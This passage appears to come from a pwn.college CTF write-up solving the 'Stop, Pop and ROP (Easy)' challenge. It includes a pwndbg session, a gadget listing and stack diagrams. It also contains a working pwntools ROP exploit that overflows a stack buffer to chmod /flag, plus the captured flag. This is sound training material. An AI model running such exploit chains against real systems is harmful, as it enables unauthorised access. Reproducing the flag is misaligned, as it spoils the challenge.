   0x0000000000402008 <+419>:   leave
   0x0000000000402009 <+420>:   ret
End of assembler dump.
```

```
pwndbg> break *(challenge+263)
Breakpoint 1 at 0x401f6c
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop-easy 
###
### Welcome to /challenge/stop-pop-and-rop-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffd7804eba0.


Breakpoint 1, 0x0000000000401f6c in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
 RBX  0x4020d0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
 R8   0x39
 R9   0x39
 R10  0x403422 ◂— 0x65520000000a0a2e /* '.\n\n' */
 R11  0x246
 R12  0x4011b0 (_start) ◂— endbr64 
 R13  0x7ffd7804ed50 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd7804ec30 —▸ 0x7ffd7804ec60 ◂— 0
 RSP  0x7ffd7804eb80 ◂— 0
 RIP  0x401f6c (challenge+263) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401f6c <challenge+263>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
        nbytes: 0x1000
 
   0x401f71 <challenge+268>    mov    dword ptr [rbp - 4], eax
   0x401f74 <challenge+271>    mov    eax, dword ptr [rbp - 4]
   0x401f77 <challenge+274>    cdqe   
   0x401f79 <challenge+276>    lea    rcx, [rbp - 0x90]
   0x401f80 <challenge+283>    mov    rdx, qword ptr [rip + 0x3151]     RDX, [rp_]
   0x401f87 <challenge+290>    sub    rcx, rdx
   0x401f8a <challenge+293>    mov    rdx, rcx
   0x401f8d <challenge+296>    add    rax, rdx
   0x401f90 <challenge+299>    shr    rax, 3
   0x401f94 <challenge+303>    mov    rdx, rax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd7804eb80 ◂— 0
01:0008│-0a8     0x7ffd7804eb88 —▸ 0x7ffd7804ed68 —▸ 0x7ffd7804f67c ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0a0     0x7ffd7804eb90 —▸ 0x7ffd7804ed58 —▸ 0x7ffd7804f65b ◂— '/challenge/stop-pop-and-rop-easy'
03:0018│-098     0x7ffd7804eb98 ◂— 0x1fb40c723
04:0020│ rax rsi 0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
05:0028│-088     0x7ffd7804eba8 —▸ 0x752efb2af951 (_IO_do_write+177) ◂— mov r13, rax
06:0030│-080     0x7ffd7804ebb0 ◂— 0
07:0038│-078     0x7ffd7804ebb8 ◂— 0xa /* '\n' */
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401f6c challenge+263
   1         0x4020af main+165
   2   0x752efb243083 __libc_start_main+243
   3         0x4011de _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffd7804eba0`
- [ ] Location of stored return address to `main()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd7804ec40:
 rip = 0x401f6c in challenge; saved rip = 0x4020af
 called by frame at 0x7ffd7804ec70
 Arglist at 0x7ffd7804ec30, args: 
 Locals at 0x7ffd7804ec30, Previous frame's sp is 0x7ffd7804ec40
 Saved registers:
  rbp at 0x7ffd7804ec30, rip at 0x7ffd7804ec38
```

- [x] Location of buffer: `0x7ffd7804eba0`
- [x] Location of stored return address to `main()`: `0x7ffd7804ec38`

Let's get the offset.

```
pwndbg> p/d 0x7ffd7804ec38 - 0x7ffd7804eba0
$1 = 152
```

Now let's look at the ROP gadgets that we have available.

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ ROPgadget --binary /challenge/stop-pop-and-rop-easy 
Gadgets information
============================================================
0x0000000000401f1d : adc al, 0 ; add al, ch ; jmp 0x401f14
0x0000000000401687 : adc eax, 0xc9fffffb ; ret
0x00000000004011dd : add ah, dh ; nop ; endbr64 ; ret
0x0000000000401487 : add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401f6b : add al, ch ; iretd
0x0000000000401f1f : add al, ch ; jmp 0x401f14
0x000000000040120b : add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401ec1 : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401f86 : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040156f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401e39 : add byte ptr [rax - 0x39], cl ; loopne 0x401e9e ; ret
0x0000000000401e49 : add byte ptr [rax - 0x39], cl ; rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401504 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401f69 : add byte ptr [rax], al ; add al, ch ; iretd
0x0000000000401502 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x00000000004012f2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x000000000040213c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004012f4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401574 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x000000000040163f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x00000000004020bc : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004020bd : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040127a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040213e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004012f6 : add byte ptr [rax], al ; jmp 0x401470
0x0000000000401576 : add byte ptr [rax], al ; jmp 0x401608
0x0000000000401641 : add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bf : add byte ptr [rax], al ; jmp 0x4016e6
0x00000000004020be : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040127b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401279 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011db : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004020bf : add cl, cl ; ret
0x000000000040120a : add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040127c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012ef : add eax, 0x3db8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401277 : add eax, 0x3e2b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401e47 : add eax, 0xc74800c3 ; rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401f93 : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401f1c : and byte ptr [rax + rax], dl ; add al, ch ; jmp 0x401f14
0x00000000004016f7 : call qword ptr [rax + 0xff3c3c9]
0x000000000040148c : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401573 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401e25 : clc ; pop rdx ; ret
0x00000000004016bc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401293 : cli ; jmp 0x401220
0x00000000004011e3 : cli ; ret
0x000000000040214b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004012f1 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401489 : cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040168a : dec ecx ; ret
0x0000000000401290 : endbr64 ; jmp 0x401220
0x00000000004011e0 : endbr64 ; ret
0x000000000040211c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040163e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004011de : hlt ; nop ; endbr64 ; ret
0x00000000004016b9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x000000000040163b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004013dd : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401205 : je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401247 : je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401294 : jmp 0x401220
0x00000000004012f8 : jmp 0x401470
0x0000000000401578 : jmp 0x401608
0x0000000000401643 : jmp 0x40166f
0x0000000000401629 : jmp 0x401675
0x00000000004014cf : jmp 0x40168b
0x00000000004016c1 : jmp 0x4016e6
0x0000000000401f21 : jmp 0x401f14
0x000000000040100b : jmp 0x4840104f
0x000000000040120c : jmp rax
0x000000000040148f : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040168b : leave ; ret
0x000000000040120d : loopne 0x401275 ; nop ; ret
0x0000000000401e3d : loopne 0x401e9e ; ret
0x0000000000401208 : mov byte ptr [rax + 0x40], dl ; add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401276 : mov byte ptr [rip + 0x3e2b], 1 ; pop rbp ; ret
0x0000000000401e5b : mov dword ptr [rbp - 0x40], 0xc35a41 ; nop ; pop rbp ; ret
0x000000000040163c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40166f
0x00000000004016ba : mov dword ptr [rbp - 4], 0 ; jmp 0x4016e6
0x0000000000401571 : mov dword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004020bb : mov eax, 0 ; leave ; ret
0x0000000000401207 : mov edi, 0x405088 ; jmp rax
0x0000000000401570 : mov qword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004011df : nop ; endbr64 ; ret
0x00000000004016f8 : nop ; leave ; ret
0x0000000000401e10 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e11 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e12 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e13 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e14 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e15 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e16 : nop ; nop ; pop rbp ; ret
0x0000000000401e17 : nop ; pop rbp ; ret
0x000000000040120f : nop ; ret
0x000000000040128c : nop dword ptr [rax] ; endbr64 ; jmp 0x401220
0x0000000000401206 : or dword ptr [rdi + 0x405088], edi ; jmp rax
0x0000000000401e5e : pop r10 ; ret
0x000000000040212c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401493 : pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040212e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401495 : pop r13 ; pop rbp ; ret
0x0000000000402130 : pop r14 ; pop r15 ; ret
0x0000000000402132 : pop r15 ; ret
0x0000000000401e4e : pop r8 ; ret
0x0000000000401e56 : pop r9 ; ret
0x0000000000401e2e : pop rax ; ret
0x000000000040212b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040212f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401496 : pop rbp ; pop rbp ; ret
0x000000000040127d : pop rbp ; ret
0x0000000000401492 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000401e57 : pop rcx ; ret
0x0000000000401e3e : pop rdi ; ret
0x0000000000401e26 : pop rdx ; ret
0x0000000000402131 : pop rsi ; pop r15 ; ret
0x0000000000401e36 : pop rsi ; ret
0x000000000040212d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401494 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401209 : push rax ; add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000401f83 : push rcx ; xor dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040101a : ret
0x00000000004014ff : ret 0x40be
0x0000000000401f96 : ret 0x458b
0x0000000000401ec4 : ret 0x8948
0x0000000000401fe9 : ret 0x8b48
0x00000000004014af : ret 0x8be
0x0000000000401f8c : retf 0x148
0x0000000000401e4c : rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401e4d : rol byte ptr [rcx + 0x58], 1 ; ret
0x0000000000401fe6 : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000401f89 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401484 : sbb byte ptr [rbx], 0 ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401485 : sbb eax, dword ptr [rax] ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401278 : sub edi, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040214d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040214c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401e46 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401203 : test eax, eax ; je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401245 : test eax, eax ; je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x0000000000401ebf : xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401f84 : xor dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148

Unique gadgets found: 158
```

Using the information we have, and some of these ROP gadgets, we can craft an exploit which uses `chmod` to change files permissions.

### ROP chain

This is the ROP chain that we will be performing.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804eba8 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec30 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec38 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec40 │  00 00 7f fd 78 04 eb a0  │ --> ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec40 │  00 00 7f fd 78 04 eb a0  │ --> ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rax
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd7804ec70 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> syscall
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initilaize values
pop_rax = 0x401e2e
pop_rdi = 0x401e3e
pop_rsi = 0x401e36
syscall = 0x401e46
buffer_addr = 0x7ffd7804eba0
ret_addr = 0x7ffd7804ec38

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop-easy')

# Extract the actual buffer address for that specific run
p.recvuntil(b"located at: ")
leak_str = p.recvline().strip().decode().strip('.')
buffer_addr = int(leak_str, 16)

flag_string = b"/flag\x00\x00\x00"

payload = flat(
    flag_string,
    b"A" * (offset - len(flag_string)),

    # chmod("/flag", 0o777)
    pop_rdi, buffer_addr,
    pop_rsi, 0o777,
    pop_rax, 90,
    syscall
)

p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:/$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop-easy': pid 2727
[*] Leaked Buffer Address: 0x7fffe80e11f0
[*] Switching to interactive mode

[*] Process '/challenge/stop-pop-and-rop-easy' stopped with exit code -11 (SIGSEGV) (pid 2727)
Received 209 bytes! This is potentially 7 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 8 gadgets of ROP chain at 0x7fffe80e1288.
| 0x0000000000401e3e: pop rdi ; ret  ; 
| 0x00007fffe80e11f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 41 41 41 41 41 41 41 41 
| 0x0000000000401e36: pop rsi ; ret  ; 
| 0x00000000000001ff: (UNMAPPED MEMORY)
| 0x0000000000401e2e: pop rax ; ret  ; 
| 0x000000000000005a: (UNMAPPED MEMORY)
| 0x0000000000401e46: syscall  ; ret  ; 
| 0x0000780ea44e260a: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; or al, 8 ; 

Leaving!
[*] Got EOF while reading in interactive
$ 
```

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:/$ cat /flag 
pwn.college{AhCJW0hDJerngeygt7SEo49RF7a.01N0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP (Hard)

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ /challenge/stop-pop-and-rop-hard 
###
### Welcome to /challenge/stop-pop-and-rop-hard!
###

